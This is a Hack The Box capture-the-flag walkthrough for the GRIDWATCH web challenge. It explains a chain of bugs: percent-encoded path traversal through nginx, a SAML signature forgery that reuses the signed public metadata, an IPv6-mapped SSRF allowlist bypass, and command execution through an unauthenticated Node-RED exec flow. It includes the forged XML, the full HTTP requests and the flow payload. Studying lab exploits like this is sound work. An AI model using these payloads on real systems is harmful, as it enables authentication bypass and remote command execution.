# GRIDWATCH - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | nginx → Python/aiohttp web app → Ruby/Sinatra SAML auth → Node-RED (no auth) |
| Flag location | `/root/flag.txt` (readable via SUID binary `/readflag`, outputs to **stderr**) |
| Vulnerability chain | Path traversal bypass → SAML signature reuse (NS-qualified ID differential) → IPv6 SSRF → Node-RED exec RCE |
| Flag | `HTB{gr1dw4tch_0p3r4t0r_s3ss10n_f0rg3d_0380795f1387669a8863e19dbf3a206d}` |

---

## Key Technologies - What They Are

**Nokogiri** - Ruby's XML/HTML parsing library. Used here by the SAML library (samlr) to parse and query the XML document. Critical to the exploit: Nokogiri's `.attribute("ID")` method returns namespace-qualified attributes (e.g. `samlp:ID`), but its XPath engine's `//*[@ID='val']` selector only matches plain (no-namespace) `@ID` attributes. This split is the root of the SAML bypass.

**samlr** - Ruby gem that implements SAML 2.0 response verification. It validates the XML digital signature, checks the IDP certificate fingerprint, and extracts the NameID from the assertion. This app uses it with two intentional misconfigs: `sign_assertion: false` (Assertion has no individual signature, trusted from a hardcoded path) and `validation_mode: :log` (schema validation errors are printed but not raised).

**SAML 2.0** - Single Sign-On protocol. An Identity Provider (IDP) signs an XML document (SAMLResponse) asserting who the user is. The Service Provider (SP) verifies the signature and grants access. The signature covers a specific XML element using XML Digital Signatures (C14N + RSA-SHA1 digest). The attack here abuses how the signature's target element is looked up at verification time.

**aiohttp/yarl** - Python async HTTP framework and its URL library. yarl decodes percent-encoded characters (like `%2F` → `/`) when constructing upstream proxy URLs. nginx does not. This mismatch enables path traversal.

**Node-RED** - Browser-based visual flow programming tool for Node.js. Lets you wire together "nodes" (HTTP listener, shell exec, HTTP response) into flows via a drag-and-drop UI, or via its REST API (`POST /flows`). Here it runs internally with `adminAuth: false` - no authentication - making it a direct RCE primitive once reached via SSRF.

**IPv6-mapped IPv4 addresses** - A way to represent an IPv4 address in IPv6 notation: `::ffff:127.0.0.11` is the IPv6 form of `127.0.0.11`. `gethostbyname("::ffff:127.0.0.11")` on Linux returns `127.0.0.11`. Used here to bypass a hostname character filter that blocked direct access to `ops.beacon`.

**SUID binary** - A Linux executable with the Set-User-ID bit set (`-rwsr-xr-x`). When run by any user, it executes with the file owner's privileges (here: root). `/readflag` uses this to read `/root/flag.txt` as root even though the process runs as `beacon`. It writes the flag to **stderr** rather than stdout - a CTF anti-trivial-capture trick.

---

## Architecture

```
[You] ──→ nginx :8080 (public, port 9090 on local)
               │
               ├── proxies /idp/* ──→ Python web app :8081
               │                            │
               │                            └── proxies to Ruby/Sinatra auth :127.0.0.12:80
               │
               └── Python web app :8081
                        ├── /sso/acs     (SAML assertion consumer)
                        ├── /relay/{feed}/ (SSRF relay - admin only)
                        └── Internal DNS resolution:
                              *.feed.beacon → 127.0.0.10  (feed renderer)
                              ops.beacon    → 127.0.0.11  (Node-RED, no auth)
                              auth.beacon   → 127.0.0.12  (Sinatra SAML auth)
```

**Auth flow (normal):**
```
Browser → POST /idp/auth (creds) → Sinatra builds SAMLResponse (signed)
       → POST /sso/acs (SAMLResponse) → Python sends to /api/verify → Sinatra verifies
       → session cookie set
```

**Credentials:** `operator@ops.beacon` / `Gr1dWatch!` (hardcoded in `auth/models/identity.rb`)

---

## Vulnerability Chain Summary

```
Step 1: Path traversal on nginx → reach /api/verify directly
         POST /idp/..%2Fapi%2Fverify

Step 2: SAML bypass via namespace-qualified ID differential
         → forge admin SAMLResponse using public /idp/metadata signature
         → verification returns is_admin=true

Step 3: POST /sso/acs with forged SAML → get admin session cookie

Step 4: SSRF to Node-RED via IPv6 bypass
         relay/[::ffff:7f00:000b]/ → socket resolves to 127.0.0.11 (Node-RED)

Step 5: Deploy exec flow on Node-RED (/readflag) → trigger → read flag
```

---

## Bug 1 - nginx Path Traversal to Internal Auth Routes

**File:** `config/nginx.conf`

### How the proxy is configured

```nginx
location /idp/ {
    proxy_pass http://127.0.0.1:8081/idp/;
}
```

The Python web app receives `/idp/<tail>` and builds:

```python
# web/controllers/handlers.py
async def proxy_idp(request):
    tail = request.match_info.get("tail", "")
    target = f"{AUTH_BASE}/idp/{tail}"   # AUTH_BASE = http://127.0.0.12
    # forwards request to Sinatra
```

nginx does **not** decode percent-encoded path separators before matching. aiohttp/yarl **does** decode them when building the upstream URL.

### The traversal

Send:
```
POST /idp/..%2Fapi%2Fverify
```

nginx sees `/idp/..%2Fapi%2Fverify` - matches the `/idp/` location block.  
aiohttp decodes `%2F` → `/`, resolves `..` → forwards to `http://127.0.0.12/idp/../api/verify` → `http://127.0.0.12/api/verify`.

Sinatra receives `POST /api/verify` directly - bypassing nginx's routing entirely.

### Why this matters

`/api/verify` is an internal endpoint that verifies SAML responses and returns `{"ok":true,"name_id":"...","is_admin":...}`. Normally only reachable from the Python web app's own `sso_acs` handler. Via traversal, we can hit it directly to test forged SAMLResponses without triggering the full SSO cookie flow.

---

## Bug 2 - SAML Signature Bypass (Namespace-Qualified ID Differential)

This is the core vulnerability. It exploits a **behavioural difference in Nokogiri** between attribute lookup and XPath matching, combined with two intentional configuration bugs.

### Intentional misconfiguration

**File:** `auth/models/identity.rb`

```ruby
Samlr.validation_mode = :log          # Bug A: schema validation errors logged, not raised
# ...
sign_assertion: false,                 # Bug B: Assertion is NOT individually signed
sign_response:  true,                  # Response IS signed
```

**Bug A** (`validation_mode: :log`) means any document that fails SAML XSD schema validation is still processed. This lets us put illegal XML inside a `samlp:Response` (e.g., embedding an `md:EntityDescriptor` inside it).

**Bug B** (`sign_assertion: false`) means the `saml:Assertion` element is **never individually signed**. samlr finds it at `DEFAULT_LOCATION = "/samlp:Response/saml:Assertion"` and trusts its contents without a cryptographic check - as long as the Response-level signature is valid.

The problem: the Response signature covers the entire `samlp:Response` element, including the Assertion inside it. So any modification to the Assertion breaks the Response signature. **Or does it?**

### The Nokogiri differential

samlr uses two different mechanisms to work with element IDs:

**Signature lookup** - finds which Signature covers which element:
```ruby
# samlr/lib/samlr/signature.rb
def initialize(original, prefix, options)
  id = @document.at(prefix.to_s, NS_MAP)&.attribute("ID")
  @signature = find_signature_for_element_id(id) if id
end
```
`element.attribute("ID")` in Nokogiri returns **the first attribute named `ID` regardless of namespace** - including namespace-qualified attributes like `samlp:ID`.

**Digest verification** - checks that a referenced element's C14N matches the DigestValue:
```ruby
# samlr/lib/samlr/signature.rb - verify_digests!
def referenced_node(id)
  nodes = document.xpath("//*[@ID='#{id}']")
  # ...
end
```
XPath `//*[@ID='value']` **only matches plain (no-namespace) `@ID` attributes**. A `samlp:ID` attribute is in the `samlp` namespace and is invisible to this XPath.

**The differential:**

| Method | Matches plain `ID` | Matches `samlp:ID` |
|---|---|---|
| `element.attribute("ID")` | Yes | **Yes** |
| XPath `//*[@ID='val']` | Yes | **No** |

### The public metadata signature

`GET /idp/metadata` returns a signed `md:EntityDescriptor`:

```xml
<?xml version="1.0"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                     ID="samlr-72a2b1db-51eb-4a9b-8331-ced82c7f252b"
                     entityID="beacon-auth-idp">
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
    <SignedInfo>
      <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      <Reference URI="#samlr-72a2b1db-51eb-4a9b-8331-ced82c7f252b">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          <Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">
            <InclusiveNamespaces xmlns="http://www.w3.org/2001/10/xml-exc-c14n#" PrefixList=""/>
          </Transform>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <DigestValue>Vc+T6YHadlq5ZXfYrwqD7R4pCCw=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>[valid RSA-SHA1 signature from IDP private key]</SignatureValue>
    <KeyInfo>
      <X509Data>
        <X509Certificate>[IDP public certificate - same as IDP_FINGERPRINT]</X509Certificate>
      </X509Data>
    </KeyInfo>
  </Signature>
  <md:SPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"/>
</md:EntityDescriptor>
```

This signature is:
- Signed by the IDP's private key (RSA-SHA1 over the C14N of SignedInfo)
- The DigestValue = SHA1 of `C14N(EntityDescriptor-minus-Signature, [])`
- The embedded X509Certificate fingerprint = `IDP_FINGERPRINT` (the same value samlr checks against)

Crucially: **this endpoint is public and requires no authentication**. The same signature is served on every request for the lifetime of the container.

### Constructing the forged SAMLResponse

We build a `samlp:Response` with three key properties:

1. **`samlp:ID`** (namespace-qualified) on the Response - not a plain `ID`
2. **Plain `ID`** on the EntityDescriptor embedded inside the Response
3. **Forged admin Assertion** at `DEFAULT_LOCATION`

```xml
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    samlp:ID="samlr-72a2b1db-51eb-4a9b-8331-ced82c7f252b"
    InResponseTo="samlr-fake-request-id"
    Version="2.0"
    IssueInstant="2026-05-17T12:00:00Z"
    Destination="/sso/acs">

  <!-- EntityDescriptor pasted verbatim from /idp/metadata -->
  <md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                       ID="samlr-72a2b1db-51eb-4a9b-8331-ced82c7f252b"
                       entityID="beacon-auth-idp">
    <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
      <!-- verbatim from metadata - real IDP RSA signature -->
    </Signature>
    <md:SPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"/>
  </md:EntityDescriptor>

  <!-- Admin Assertion at DEFAULT_LOCATION - trusted without individual signature -->
  <saml:Assertion Version="2.0" ID="samlr-assertion-1" IssueInstant="2026-05-17T12:00:00Z">
    <saml:Issuer>beacon-auth-idp</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        operator-admin@ops.beacon
      </saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData InResponseTo="samlr-fake-request-id"
                                      NotOnOrAfter="2027-05-17T12:00:00Z"
                                      Recipient="/sso/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-05-16T12:00:00Z" NotOnOrAfter="2027-05-17T12:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>beacon-sso</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2026-05-17T12:00:00Z" SessionIndex="samlr-assertion-1">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>
```

### How samlr processes this document

**Step A - Schema validation (`Tools.parse`)**

```ruby
Samlr::Tools.validate!(document: doc)
# FAILS: EntityDescriptor inside Response violates SAML schema

# But with :log mode:
raise e unless Samlr.validation_mode == :log   # :log → continues anyway
```
Schema errors are logged and ignored. ✓

**Step B - Response signature lookup (`response.signature`)**

```ruby
# Signature.new with prefix = "/samlp:Response"
id = @document.at("/samlp:Response", NS_MAP)&.attribute("ID")
#   └─ Response has samlp:ID="samlr-UUID" but NO plain ID
#   └─ .attribute("ID") returns the samlp:ID attribute value: "samlr-UUID"

@signature = find_signature_for_element_id("samlr-UUID")
#   └─ finds <Signature> where Reference URI="#samlr-UUID" → the metadata Signature ✓
```

`signature.missing?` = false (Signature found, certificate present). ✓

**Step C - Fingerprint check**

```ruby
verify_fingerprint!
# certificate from Signature's X509Certificate = IDP's public cert
# IDP_FINGERPRINT = SHA256 of same cert → MATCH ✓
```

**Step D - RSA signature check**

```ruby
verify_signature!
# C14N(SignedInfo) → RSA-verify using IDP public key
# SignedInfo is verbatim from metadata → real IDP signature → VALID ✓
```

**Step E - Digest check (`verify_digests!`)**

```ruby
# Remove enveloped signature:
signed_element = @document.at("/samlp:Response", NS_MAP)   # = our Response
is_enveloped = signed_element.xpath(".//ds:Signature", NS_MAP).include?(@signature)
# Signature IS inside Response (inside EntityDescriptor) → is_enveloped = true
@signature.remove   # removes <Signature> from EntityDescriptor

# Find the referenced element:
node = referenced_node("samlr-UUID")
#   └─ document.xpath("//*[@ID='samlr-UUID']")
#   └─ XPath @ID only matches PLAIN ID attributes
#   └─ Response has samlp:ID (namespace-qualified) → NOT matched
#   └─ EntityDescriptor has plain ID="samlr-UUID" → MATCHED (1 result) ✓

canoned = node.canonicalize(C14N, [])
# C14N(EntityDescriptor-without-Signature, [])
# EntityDescriptor structure is unchanged from original metadata
# Exclusive C14N with [] inclusive list → ancestor samlp/saml namespaces NOT inherited
# Output is byte-for-byte identical to original → matches DigestValue ✓
```

**Step F - Assertion verification (`assertion.verify!`)**

```ruby
# assertion.signature uses prefix = "/samlp:Response/saml:Assertion"
# Assertion has ID="samlr-assertion-1"
# No Signature in document with Reference URI="#samlr-assertion-1"
# → assertion.signature.missing? = true
# → signature.verify! is SKIPPED (no assertion signature needed with sign_assertion:false)
# → DEFAULT_LOCATION used: "/samlp:Response/saml:Assertion" → finds our forged Assertion ✓

# Conditions check:
# not_before (past), not_on_or_after (future) → satisfied ✓
# audience check: options[:audience] = nil → satisfied unconditionally ✓
```

**Step G - Name ID extraction**

```ruby
assertion.name_id
#   └─ assertion = document.at("/samlp:Response/saml:Assertion")
#   └─ name_id_node = assertion.at("./saml:Subject/saml:NameID")
#   └─ .text = "operator-admin@ops.beacon" ✓

admin_principal?("operator-admin@ops.beacon")
#   └─ "operator-admin@ops.beacon".downcase == "operator-admin@ops.beacon" → true ✓
```

**Result:** `{"ok":true,"name_id":"operator-admin@ops.beacon","is_admin":true}`

### Why the two intentional bugs are both necessary

| Bug | Role |
|---|---|
| `sign_assertion: false` | Admin Assertion at DEFAULT_LOCATION has no individual signature - we can forge any NameID without needing the IDP private key |
| `validation_mode: :log` | Schema violation (EntityDescriptor nested inside Response) is silently ignored - the document parses and processes without error |

Without `sign_assertion: false`, samlr would verify the Assertion signature and reject our unsigned forged Assertion.  
Without `validation_mode: :log`, the schema check would raise and reject the document before signature verification begins.

### Exclusive C14N namespace isolation (why the digest matches)

The EntityDescriptor's C14N uses **Exclusive C14N** with an empty inclusive-namespaces list (`PrefixList=""`). In exclusive C14N:

- Only namespaces **visibly utilized** in the element's subtree are emitted
- Ancestor namespace declarations (`xmlns:samlp`, `xmlns:saml` from the parent Response) are **not propagated** unless the element uses those prefixes

The EntityDescriptor and its child `md:SPSSODescriptor` only use the `md` prefix. So its C14N output when nested inside the Response is **identical** to its standalone C14N output in the original metadata.

This is why `C14N(EntityDescriptor-in-Response) == C14N(EntityDescriptor-standalone)` → DigestValue still matches.

---

## Bug 3 - IPv6 SSRF Bypass to Node-RED

**File:** `web/controllers/handlers.py`

### The relay endpoint

```python
# Only admin sessions can use this
async def fetch_feed(request):
    feed = filter_bad_characters(request.match_info["feed"])
    target = f"http://{feed}.feed.beacon:80{relay_path}"
    if not _relay_target_allowed(target):
        return web.Response(text="Feed target not reachable", status=502)
    ...

_ALLOWED_RELAY_IPS = {
    ipaddress.ip_address("127.0.0.10"),  # feed renderer
    ipaddress.ip_address("127.0.0.11"),  # Node-RED
}

def _relay_target_allowed(target_url):
    host = URL(target_url).host         # yarl URL parser
    addr = socket.gethostbyname(host)   # DNS resolution
    return ipaddress.ip_address(addr) in _ALLOWED_RELAY_IPS
```

`filter_bad_characters` blocks `;<=>?@` but not `[`, `:`, `]`. The `{feed}` route pattern matches `[0-z]+` which includes `[`, `]`, `:`.

### The bypass

yarl parses `http://[::ffff:7f00:000b].feed.beacon:80/` and extracts the host as `::ffff:127.0.0.11` (IPv6 address). `socket.gethostbyname("::ffff:127.0.0.11")` returns `127.0.0.11` - which is in `_ALLOWED_RELAY_IPS`.

**Feed value:** `[::ffff:7f00:000b]` (URL-encoded: `%5B%3A%3Affff%3A7f00%3A000b%5D`)

```
Target URL built:  http://[::ffff:7f00:000b].feed.beacon:80/flows
yarl extracts host: ::ffff:127.0.0.11
gethostbyname():   127.0.0.11  ← Node-RED ✓
```

### Node-RED has no authentication

`/app/nodered/settings.js` sets `adminAuth: false`. All admin API endpoints (`/flows`, `/nodes`, etc.) are accessible without credentials.

---

## Bug 4 - Node-RED exec Node RCE

Node-RED allows building HTTP flows. The `exec` node runs an arbitrary OS command and pipes the output to the response.

### Deploying the flow

```json
POST /relay/%5B%3A%3Affff%3A7f00%3A000b%5D/?path=/flows
Content-Type: application/json

[
  {"id":"tab1","type":"tab","label":"attack"},
  {"id":"n1","type":"http in","z":"tab1","url":"/run","method":"get","wires":[["n2"]]},
  {"id":"n2","type":"exec","z":"tab1","command":"bash -c '/readflag 2>&1'","addpay":false,"useSpawn":"false","wires":[["n3"],[],[]]},
  {"id":"n3","type":"http response","z":"tab1","statusCode":"200","wires":[[]]}
]
```

Response: `204 No Content` (flow deployed).

**Critical:** `/readflag` writes the flag to **stderr**, not stdout. The Node-RED exec node routes stdout → output 1 (our HTTP response) and stderr → output 2 (wired to nothing). Using `bash -c '/readflag 2>&1'` merges stderr into stdout so the flag reaches the response body.

### Triggering execution

```
GET /relay/%5B%3A%3Affff%3A7f00%3A000b%5D/?path=/run
Cookie: beacon_session=<admin>
```

Response body: `HTB{gr1dw4tch_0p3r4t0r_s3ss10n_f0rg3d_0380795f1387669a8863e19dbf3a206d}`

---

## Step-by-Step HTTP Requests

### Step 1 - Verify path traversal works

```http
POST /idp/..%2Fapi%2Fverify HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<b64-of-any-legit-response>
```

Expected response:
```json
{"ok":true,"name_id":"testuser@test.com","is_admin":false}
```

### Step 2 - Fetch the IDP metadata

```http
GET /idp/metadata HTTP/1.1
Host: <target>
```

Grab the full `md:EntityDescriptor` XML (including the `<Signature>` element and the `ID` attribute value).

### Step 3 - Submit the forged SAMLResponse

Construct the forged XML (see Bug 2 section), base64-encode it:

```http
POST /idp/..%2Fapi%2Fverify HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<b64-of-forged-response>
```

Expected:
```json
{"ok":true,"name_id":"operator-admin@ops.beacon","is_admin":true}
```

### Step 4 - Get the admin session cookie

```http
POST /sso/acs HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<same-b64-as-above>
```

Response: `302 Found` with `Set-Cookie: beacon_session=<token>; HttpOnly; SameSite=Lax`

### Step 5 - Deploy Node-RED exec flow

```http
POST /relay/%5B%3A%3Affff%3A7f00%3A000b%5D/ HTTP/1.1
Host: <target>
Cookie: beacon_session=<token>
Content-Type: application/json

[{"id":"tab1","type":"tab","label":"attack"},{"id":"n1","type":"http in","z":"tab1","url":"/run","method":"get","wires":[["n2"]]},{"id":"n2","type":"exec","z":"tab1","command":"bash -c '/readflag 2>&1'","addpay":false,"useSpawn":"false","wires":[["n3"],[],[]]},{"id":"n3","type":"http response","z":"tab1","statusCode":"200","wires":[[]]}]
```

Response: `204 No Content`

### Step 6 - Trigger execution and read the flag

```http
GET /relay/%5B%3A%3Affff%3A7f00%3A000b%5D/ HTTP/1.1
Host: <target>
Cookie: beacon_session=<token>
```

With query parameter `?path=/run`:

```http
GET /relay/%5B%3A%3Affff%3A7f00%3A000b%5D/?path=/run HTTP/1.1
Host: <target>
Cookie: beacon_session=<token>
```

Response: `HTB{...flag...}`

---

## Running the Exploit Script

```bash
# Edit TARGET in the script first
nano /home/kali/Documents/HTBCTF/web/GRIDWATCH/exploit_gridwatch.py
# Change: TARGET = "http://<htb-instance-ip-or-url>"

python3 /home/kali/Documents/HTBCTF/web/GRIDWATCH/exploit_gridwatch.py
```

The script:
1. Fetches `/idp/metadata` fresh (works with any per-instance cert and signature)
2. Builds and submits the forged SAMLResponse
3. Verifies via path traversal first
4. Gets admin session cookie
5. Deploys exec flow on Node-RED via SSRF
6. Triggers `/readflag` and prints the flag

---

## Key Takeaways

| Concept | Detail |
|---|---|
| Namespace-qualified ID differential | `element.attribute("ID")` in Nokogiri returns `ns:ID` attrs; XPath `@ID` does not - creates a split where signature lookup and digest lookup find different elements |
| Metadata signature reuse | The IDP's own signed metadata is publicly accessible and can be repurposed as a Response-level signature without the private key |
| `sign_assertion: false` | Removes the need to forge or steal the RSA private key - the Assertion content is trusted without cryptographic verification |
| `validation_mode: :log` | Allows schema-invalid XML (EntityDescriptor nested in Response) to be processed silently |
| Exclusive C14N namespace isolation | Ancestor namespace declarations don't propagate to child element C14N - EntityDescriptor C14N is identical whether standalone or nested inside a Response |
| Path traversal via encoding | nginx doesn't normalize `%2F` before routing; aiohttp/yarl decodes it when building the upstream URL - enables direct access to internal routes |
| IPv6 SSRF bypass | yarl parses `[::ffff:7f00:000b].feed.beacon` as an IPv6 host; `gethostbyname` resolves `::ffff:127.0.0.11` to `127.0.0.11`; allowlist check passes |
| Node-RED exec node | `adminAuth: false` + exec node = unauthenticated OS command execution via HTTP |
